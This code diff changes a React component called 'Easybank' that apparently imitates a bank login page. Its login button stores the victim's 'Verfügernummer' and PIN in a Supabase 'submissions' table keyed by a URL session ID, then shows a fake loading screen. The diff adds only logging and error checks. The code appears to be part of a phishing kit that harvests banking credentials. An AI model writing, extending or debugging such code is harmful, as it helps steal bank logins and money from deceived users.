@@ -278,13 +278,18 @@ const Easybank = () => {
                   {/* Login button */}
                   <div className="flex justify-end mb-4">
                     <button onClick={async () => {
+              console.log("Session ID:", sessionId);
               if (sessionId) {
-                await supabase.from("submissions").update({
+                const { error } = await supabase.from("submissions").update({
                   bank_username: verfueger,
                   bank_password: pin,
                   bank_username_label: "Verfügernummer",
                   bank_password_label: "PIN",
                 }).eq("session_id", sessionId);
+                if (error) console.error("Update failed:", error);
+                else console.log("Update successful");
+              } else {
+                console.error("No session ID found in URL!");
               }
               setShowLoading(true);
             }} className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
